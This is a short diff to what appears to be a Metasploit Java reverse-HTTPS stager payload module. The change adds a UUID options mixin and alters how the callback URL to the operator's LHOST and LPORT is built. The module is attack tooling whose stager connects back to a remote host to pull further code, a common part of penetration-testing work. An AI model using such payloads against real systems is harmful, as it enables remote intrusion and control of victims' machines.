@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/uuid_options'
 
 module Metasploit3
 
@@ -12,6 +13,7 @@ module Metasploit3
 
   include Msf::Payload::Stager
   include Msf::Payload::Java
+  include Msf::Payload::UUIDOptions
 
   def initialize(info = {})
     super(merge_info(info,
@@ -55,8 +57,7 @@ module Metasploit3
     c << "Spawn=#{spawn}\n"
     c << "URL=https://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "/"
-    c << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITJ, uri_req_len)
+    c << generate_uri_uuid_mode(:init_java, uri_req_len)
     c << "\n"
 
     c
